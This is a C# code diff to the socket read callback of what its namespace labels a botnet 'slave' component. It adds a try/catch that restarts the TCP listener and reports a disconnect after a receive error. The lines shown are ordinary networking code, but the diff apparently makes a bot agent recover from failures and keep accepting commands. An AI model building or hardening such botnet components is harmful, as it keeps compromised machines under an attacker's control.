@@ -31,14 +31,26 @@ namespace CozyThunder.Botnet.Slave
         {
             StateObject state = (StateObject)ar.AsyncState;
             Socket handler = state.workSocket;
-            int bytesRead = handler.EndReceive(ar);
-            if (bytesRead > 0)
+            try
             {
-                state.sb.Append(Encoding.ASCII.GetString(state.buffer, 0, bytesRead));
-                String content = state.sb.ToString();
-                listener_?.OnMessage(content);
+                int bytesRead = handler.EndReceive(ar);
+                if (bytesRead > 0)
+                {
+                    state.sb.Append(Encoding.ASCII.GetString(state.buffer, 0, bytesRead));
+                    String content = state.sb.ToString();
+                    listener_?.OnMessage(content);
+                }
+                handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
             }
-            handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
+            catch
+            {
+                socket_.Stop();
+                socket_ = new TcpListener(EndPoint);
+                socket_.Start(1);
+                socket_.BeginAcceptSocket(AcceptCallback, socket_);
+
+                listener_?.OnDisConnect();
+            }
         }
 
         void SendCallback(IAsyncResult ar)
